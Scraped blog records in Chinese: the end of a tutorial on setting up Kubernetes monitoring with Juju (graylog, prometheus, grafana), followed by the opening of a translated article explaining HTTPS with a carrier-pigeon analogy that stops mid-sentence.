data-line=\"crayon-5b4a92b1d8bfe550872623-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bfe550872623-1\"><span class=\"crayon-p\">## relate graylog applications</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bfe550872623-2\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">apache2</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">reverseproxy </span><span class=\"crayon-v\">graylog</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">website</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bfe550872623-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">graylog</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">elasticsearch </span><span class=\"crayon-v\">elasticsearch</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">client</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bfe550872623-4\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">graylog</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">mongodb </span><span class=\"crayon-v\">mongodb</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">database</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bfe550872623-5\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">filebeat</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">beats</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">host </span><span class=\"crayon-v\">kubernetes</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">master</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">juju</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bfe550872623-6\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">filebeat</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">beats</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">host </span><span class=\"crayon-v\">kubernetes</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">worker</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">jujuu</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">info</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bfe550872623-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8c01859773774\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n## relate prometheus applications\r\njuju relate prometheus:grafana-source grafana:grafana-source\r\njuju relate telegraf:prometheus-client prometheus:target\r\njuju relate kubernetes-master:juju-info telegraf:juju-info\r\njuju relate kubernetes-worker:juju-info telegraf:juju-info\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c01859773774-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c01859773774-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c01859773774-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c01859773774-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c01859773774-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c01859773774-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c01859773774-1\"><span class=\"crayon-p\">## relate prometheus applications</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c01859773774-2\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">prometheus</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">grafana</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">source </span><span class=\"crayon-v\">grafana</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">grafana</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">source</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c01859773774-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">telegraf</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">prometheus</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">client </span><span class=\"crayon-v\">prometheus</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">target</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c01859773774-4\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">kubernetes</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">master</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">juju</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">info </span><span class=\"crayon-v\">telegraf</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">juju</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">info</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c01859773774-5\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">relate </span><span class=\"crayon-v\">kubernetes</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">worker</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">juju</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">info </span><span class=\"crayon-v\">telegraf</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">juju</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c01859773774-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>这个时候，所有的应用程序已经可以相互之间进行通讯了，但是我们还需要多做一点配置（比如，配置 apache2 反向代理、告诉 prometheus 如何从 K8s 中取数、导入到 grafana 仪表板等等）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8c05067939908\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n## configure graylog applications\r\njuju config apache2 enable_modules=\"headers proxy_html proxy_http\"\r\njuju config apache2 vhost_http_template=\"$(base64 &lt;vhost-tmpl&gt;)\"\r\njuju config elasticsearch firewall_enabled=\"false\"\r\njuju config filebeat \\\r\n logpath=\"/var/log/*.log /var/log/containers/*.log\"\r\njuju config filebeat logstash_hosts=&lt;graylog-ip&gt;\":5044\"\r\njuju config graylog elasticsearch_cluster_name=\"&lt;es-cluster&gt;\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c05067939908-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c05067939908-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c05067939908-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c05067939908-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c05067939908-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c05067939908-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c05067939908-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c05067939908-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c05067939908-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c05067939908-1\"><span class=\"crayon-p\">## configure graylog applications</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c05067939908-2\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">config </span><span class=\"crayon-e\">apache2 </span><span class=\"crayon-v\">enable_modules</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"headers proxy_html proxy_http\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c05067939908-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">config </span><span class=\"crayon-e\">apache2 </span><span class=\"crayon-v\">vhost_http_template</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"$(base64 &lt;vhost-tmpl&gt;)\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c05067939908-4\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">config </span><span class=\"crayon-e\">elasticsearch </span><span class=\"crayon-v\">firewall_enabled</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"false\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c05067939908-5\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">config </span><span class=\"crayon-i\">filebeat</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c05067939908-6\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">logpath</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"/var/log/*.log /var/log/containers/*.log\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c05067939908-7\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">config </span><span class=\"crayon-e\">filebeat </span><span class=\"crayon-v\">logstash_hosts</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">graylog</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ip</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-s\">\":5044\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c05067939908-8\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">config </span><span class=\"crayon-e\">graylog </span><span class=\"crayon-v\">elasticsearch_cluster_name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"&lt;es-cluster&gt;\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c05067939908-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8c08781082760\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n## configure prometheus applications\r\njuju config prometheus scrape-jobs=\"&lt;scraper-yaml&gt;\"\r\njuju run-action --wait grafana/0 import-dashboard \\\r\n dashboard=\"$(base64 &lt;dashboard-json&gt;)\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c08781082760-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c08781082760-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c08781082760-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c08781082760-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c08781082760-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c08781082760-1\"><span class=\"crayon-p\">## configure prometheus applications</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c08781082760-2\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">config </span><span class=\"crayon-e\">prometheus </span><span class=\"crayon-v\">scrape</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">jobs</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"&lt;scraper-yaml&gt;\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c08781082760-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">action</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">wait </span><span class=\"crayon-v\">grafana</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">import</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">dashboard</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c08781082760-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dashboard</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"$(base64 &lt;dashboard-json&gt;)\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c08781082760-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>以上的步骤需要根据你的部署来指定一些值。你可以用与 <code>conjure-up</code> 相同的方法得到这些：</p>\n<ul>\n<li><code>&lt;vhost-tmpl&gt;</code>： 从 github 获取我们的示例 <a href=\"https://raw.githubusercontent.com/conjure-up/spells/master/canonical-kubernetes/addons/graylog/steps/01_install-graylog/graylog-vhost.tmpl\">模板</a></li>\n<li><code>&lt;graylog-ip&gt;</code>： <code>juju run --unit graylog/0 'unit-get private-address'</code></li>\n<li><code>&lt;es-cluster&gt;</code>： <code>juju config elasticsearch cluster-name</code></li>\n<li><code>&lt;scraper-yaml&gt;</code>： 从 github 获取我们的示例 <a href=\"https://raw.githubusercontent.com/conjure-up/spells/master/canonical-kubernetes/addons/prometheus/steps/01_install-prometheus/prometheus-scrape-k8s.yaml\">scraper</a> ；<code>[K8S_PASSWORD][20]</code> 和 <code>[K8S_API_ENDPOINT][21]</code> <a href=\"https://github.com/conjure-up/spells/blob/master/canonical-kubernetes/addons/prometheus/steps/01_install-prometheus/after-deploy#L25\">substitute</a> 的正确值</li>\n<li><code>&lt;dashboard-json&gt;</code>： 从 github 获取我们的 <a href=\"https://raw.githubusercontent.com/conjure-up/spells/master/canonical-kubernetes/addons/prometheus/steps/01_install-prometheus/grafana-telegraf.json\">主机</a> 和 <a href=\"https://raw.githubusercontent.com/conjure-up/spells/master/canonical-kubernetes/addons/prometheus/steps/01_install-prometheus/grafana-k8s.json\">k8s</a> 仪表板</li>\n</ul>\n<p>最后，发布 apache2 和 grafana 应用程序，以便于可以通过它们的 web 界面访问：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8c0d870842470\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n## expose relevant endpoints\r\njuju expose apache2\r\njuju expose grafana\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c0d870842470-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c0d870842470-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8c0d870842470-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8c0d870842470-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c0d870842470-1\"><span class=\"crayon-p\">## expose relevant endpoints</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c0d870842470-2\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">expose </span><span class=\"crayon-e\">apache2</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8c0d870842470-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">expose </span><span class=\"crayon-i\">grafana</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8c0d870842470-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>现在我们已经完成了所有的部署、配置、和发布工作，你可以使用与上面的<strong>浏览日志</strong>和<strong>浏览指标</strong>部分相同的方法去查看它们。</p>\n<h3 id=\"toc_7\">总结</h3>\n<p>我的目标是向你展示如何去部署一个 Kubernetes 集群，很方便地去监视它的日志和指标。无论你是喜欢向导的方式还是命令行的方式，我希望你清楚地看到部署一个监视系统并不复杂。关键是要搞清楚所有部分是如何工作的，并将它们连接到一起工作，通过断开/修复/重复的方式，直到它们每一个都能正常工作。</p>\n<p>这里有一些像 conjure-up 和 Juju 一样非常好的工具。充分发挥这个生态系统贡献者的专长让管理大型软件变得更容易。从一套可靠的应用程序开始，按需定制，然后投入到工作中！</p>\n<p>大胆去尝试吧，然后告诉我你用的如何。你可以在 Freenode IRC 的 <strong>#conjure-up</strong> 和 <strong>#juju</strong> 中找到像我这样的爱好者。感谢阅读！</p>\n<h3 id=\"toc_8\">关于作者</h3>\n<p>Kevin 在 2014 年加入 Canonical 公司，他专注于复杂软件建模。他在 Juju 大型软件团队中找到了自己的位置，他的任务是将大数据和机器学习应用程序转化成可重复的（可靠的）解决方案。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113875\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113875votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113875\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,集群", "url": "http://blog.jobbole.com/113875/", "url_obj_id": "a0e861fe08356d9eabe96fbd21c0753d"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/9b4c9b679332b4ee36faf1fb4002ed2f.png"], "title": "用信鸽来解释 HTTPS", "create_date": "2018/04/14 ·", "praise_num": 1, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://medium.freecodecamp.org/https-explained-with-carrier-pigeons-7029d2193351\">Andrea Zanin</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/https-explained-with-carrier-pigeons\">开源中国</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/9b4c9b679332b4ee36faf1fb4002ed2f.png\"></p>\n<p>密码学是一门难以理解的学科，因为它充满了数学定理。但是除非你要实际开发出一套加密算法系统，否则你是没必要强制理解那些深奥的数学定理的。</p>\n<p>如果你阅读本文的目的是想设计下一套 HTTPS 协议，那我只能抱歉的说本文的知识还远远不够；如果不是的话，那么就煮杯咖啡，轻松愉悦的阅读本文吧。</p>\n<p><strong>爱丽丝、鲍伯和 … 信鸽？</strong></p>\n<p>你在互联网上从事的任何活动（阅读这篇文章、在亚马逊上购物、上传图片等）归结到底都是从某台服务器上发送和接收信息。</p>\n<p>这个说起来可能有点抽象，不如让我们假设这些消息都是由信鸽来传递的。我知道这个假设有些太过随意，但相信我 HTTPS 就是这样工作的，尽管它的速度快的多。</p>\n<p>我们先不谈服务器、客户端或者黑客攻击，先来聊一下爱丽丝、鲍伯和马洛里。如果这已不是你第一次接触密码学理论，你应该会认识这些名字，因为他们经常在各种密码学文献中被提及。</p>\n<p><strong>初级交流</strong></p>\n<p>如果爱丽丝想要给鲍勃发送一段信息，她会把信息绑在信鸽的腿上然后送往鲍勃那里。鲍勃收到了信息，并阅读了信息，非常完美。</p>\n<p>但如果马洛里拦截了爱丽丝的鸽子并且篡改了信息呢？鲍勃就没有办法去知道爱丽丝发出的信息在传递过程中遭到了修改。</p>\n<p>这就是 HTTP 如何运作的。看起来很可怕对吧？我是不会通过 HTTP 